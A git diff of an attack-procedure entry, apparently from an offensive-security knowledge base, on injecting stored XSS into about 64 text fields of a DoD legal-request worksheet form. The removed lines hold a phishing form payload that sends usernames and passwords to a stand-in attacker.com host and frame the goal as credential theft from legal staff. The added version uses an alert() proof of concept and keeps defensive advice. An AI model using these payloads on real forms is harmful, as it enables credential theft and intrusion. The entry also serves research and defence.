@@ -1,9 +1,9 @@
 ---
-id: proc-uuid-003
+id: proc-inject-xss-payloads
 tags:
-  - payload-injection
+  - xss
+  - injection
   - stored-xss
-  - javascript
 type: procedure
 tools: []
 tactics:
@@ -16,7 +16,7 @@ submitted: true
 created_at: '2023-10-01T00:00:00Z'
 techniques:
   - '[[JavaScript]]'
-updated_at: '2025-12-14T03:16:36.859Z'
+updated_at: '2025-12-14T17:33:06.185Z'
 skill_level: intermediate
 impact_level: high
 detection_risk: medium
@@ -31,57 +31,41 @@ mitre_techniques:
 
 ## Summary
 
-This procedure details injecting malicious JavaScript payloads into the 64 vulnerable text fields of the DoD worksheet form to store exploitable XSS code server-side, targeting credential theft upon viewing.
+Injects malicious JavaScript into approximately 64 text fields in the DoD worksheet form, exploiting inadequate sanitization for stored XSS.
 
 ## Description
 
-Once vulnerabilities are confirmed, this step involves crafting and inserting payloads like phishing forms or exfiltration scripts into every text field. The form's lack of filtering allows HTML and <script> tags to persist. In an attack scenario, this stores the payload for later execution by victims (e.g., legal staff). Prerequisites: Form access and payload knowledge; outcomes: Worksheet ready for submission with embedded malice.
+Post-initial submission, text fields accept HTML/JS without filtering. Payloads persist in storage and execute on view. Targets legal request app; outcomes include payload storage for later execution.
 
 ## Requirements
 
-1. Identified list of 64 vulnerable fields
-2. Attacker-controlled server for data reception (e.g., http://attacker.com)
-3. Crafted payloads for specific impacts (phishing, cookie theft)
+1. Access to post-name form sections
+2. Knowledge of XSS payloads
+3. Browser dev tools for testing
 
 ## Defense
 
-Defensive measures and detection strategies:
-
-- Sanitize all user inputs using libraries like DOMPurify or OWASP ESAPI
-- Strip or escape special characters (<, >, ", ') in text fields
-- Implement content security policy (CSP) to block inline scripts
+- Implement output encoding (e.g., HTML entity escaping)
+- Use Content Security Policy (CSP) to block inline scripts
+- WAF rules for common XSS patterns
 
 ## Objectives
 
-1. Embed functional XSS payloads across all exploitable fields
-2. Ensure payloads target high-impact actions like credential capture
-3. Maintain form validity to avoid submission blocks
+1. Populate vulnerable fields with JS
+2. Ensure payload acceptance
+3. Count and target all 64 fields
 
 ## Instructions
 
-### Step 1: Prepare Payloads
+### Step 1: Identify and Fill Fields
 
-**Context**: Select payloads for injection.
+**Context**: Scan for text inputs and inject.
 
-Use phishing: <h3>Please login to proceed</h3><form action="http://attacker.com/steal">Username:<br><input type="text" name="username"><br>Password:<br><input type="password" name="password"><br><input type="submit" value="Logon"></form>
+```plaintext
+Complete the form, filling in XSS payloads anywhere you can type. Example: <script>alert('XSS')</script>
+```
 
-> Tailor for theft. Expected output: Valid HTML/JS snippet.
-
-### Step 2: Inject into Fields
-
-**Context**: Fill the form systematically.
-
-Paste payloads into each of the 64 text fields.
-
-> Cover all areas. Expected output: Form populated; preview shows raw code.
-
-### Step 3: Validate Persistence
-
-**Context**: Check for immediate issues.
-
-Review form before submit.
-
-> No errors. Expected output: Payloads intact.
+> Fields accept input. Expected: No rejection; 64 fields vulnerable.
 
 ## MITRE ATT&CK Mapping
 
@@ -104,5 +88,6 @@ Review form before submit.
 
 ## Tags
 
+- [[xss]]
 - [[injection]]
-- [[payload]]
+- [[stored-xss]]
